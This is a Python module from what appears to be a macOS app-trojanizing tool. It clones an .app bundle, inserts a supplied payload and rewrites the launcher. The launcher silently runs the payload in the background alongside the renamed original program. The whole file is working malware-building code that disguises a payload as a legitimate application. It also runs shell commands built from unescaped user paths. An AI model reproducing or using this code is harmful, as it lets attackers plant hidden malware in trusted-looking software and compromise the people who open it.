from os import chdir, path
from subprocess import call

from .get_app import get_app_name
from .logic import check_app_path, check_inputs

C_None = "\x1b[0;39m"
C_BRed = "\x1b[1;31m"


def inject_app(args, include_files):

    # 1 | Check for valid folder
    check_app_path(args)

    # 2 | Checking for a valid input
    output = check_inputs(args)

    # 3 | Cloning the application
    print("[i] Cloning the application...")

    if path.isdir(output) or path.isdir(args.output[0]):
        print(C_BRed + ("[!] The output directory already exists: %s" % output) + C_None)
        quit()

    try:
        call(("cp -r '%s' '%s'" % (args.app[0], output)), shell=True)
        print("[+] The application was sucessfully cloned.")

    except Exception:
        print(C_BRed + ("[!] Cannot write to output: %s" % output) + C_None)
        quit()

    # 4 | Checking things
    print("[i] Injecting script...")

    appname = get_app_name(args)

    try:
        chdir(output + "/Contents/MacOS/")
    except Exception:
        print(C_BRed + "[!] Cannot access the applications start file." + C_None)
        quit()

    # 5 | Including files
    if include_files:

        print("[i] Including the content of the given folder...")

        if path.isdir(args.include[0]):
            print("[+] Getting the files: %s" % args.include[0])
        else:
            print(C_BRed + ("[!] Cannot find folder to include: %s" % args.include[0]) + C_None)
            quit()

        try:
            call(("cp -a '%s/.' ." % args.include[0]), shell=True)
        except Exception:
            print(C_BRed + "[!] Cannot include the files." + C_None)
            quit()

        print("[i] Make the included files executable...")
        try:
            call(("chmod +x *"), shell=True)
        except Exception:
            print(C_BRed + "[!] Cannot make the files executable." + C_None)
            quit()

    # 6 | Changing the start order
    print("[i] Changing the start order...")

    try:
        call(("cp '%s' payload" % args.inject[0]), shell=True)
    except Exception:
        print(C_BRed + "[!] Cannot insert the injection." + C_None)
        quit()

    try:
        call(("mv '%s' 'injectra'" % appname), shell=True)
    except Exception:
        print(C_BRed + "[!] Cannot rearrange the start order." + C_None)
        quit()

    try:
        call(('echo \'#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; cd $DIR\n$DIR/payload &\n$DIR/injectra &\' > "%s"' % appname), shell=True)
    except Exception:
        print(C_BRed + "[!] Cannot write new a start order." + C_None)
        quit()

    try:
        call(("chmod +x injectra ; chmod +x payload ; chmod +x '%s'" % appname), shell=True)
    except Exception:
        print(C_BRed + "[!] Cannot make the injection executable." + C_None)
        quit()

    try:
        chdir("../../../")
        call(("mv '%s' '%s'" % (output, args.output[0])), shell=True)
    except Exception:
        print(C_BRed + "[!] Cannot make the application visible." + C_None)
        quit()

    print("[+] The injection was sucessful.")
